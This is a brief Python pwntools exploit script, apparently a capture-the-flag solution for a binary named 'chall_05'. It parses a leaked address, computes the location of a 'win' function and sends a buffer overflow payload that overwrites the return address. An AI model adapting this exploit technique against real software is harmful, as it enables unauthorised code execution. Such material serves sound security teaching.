import pwn

pwn.context.arch = 'amd64'

elf = pwn.context.binary = pwn.ELF("./chall_05")

filler = 0x58 
offset = 0x2e # 0xfd if you wanted to rerun it for some reason

diff = elf.sym.main - elf.sym.win

payload = b"A"*filler 

p = pwn.process(elf.path)

# get the leak address
p.recvuntil(b"I wonder what this is: ")
leak = int(p.recvuntil(b"\n"), 16)

payload += pwn.p64(leak + diff - offset)

p.sendline(payload)

p.interactive()
